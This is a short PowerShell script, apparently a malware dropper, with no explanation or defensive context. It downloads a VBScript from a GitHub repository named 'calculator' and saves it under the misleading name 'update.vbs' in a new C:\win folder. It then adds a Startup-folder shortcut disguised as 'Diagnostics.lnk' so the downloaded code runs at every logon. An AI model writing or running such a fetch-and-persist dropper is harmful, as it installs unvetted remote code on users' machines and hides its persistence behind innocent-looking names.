
$objShell = New-Object -com "Wscript.Shell"

cd /
mkdir win
Invoke-WebRequest -Uri https://raw.githubusercontent.com/rustgod455/calculator/main/open.vbs -OutFile c:/win/update.vbs

$objShortcut = $objShell.CreateShortcut("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Diagnostics.lnk")
$objShortcut.TargetPath = "c:/win/update.vbs"
$objShortcut.Save()
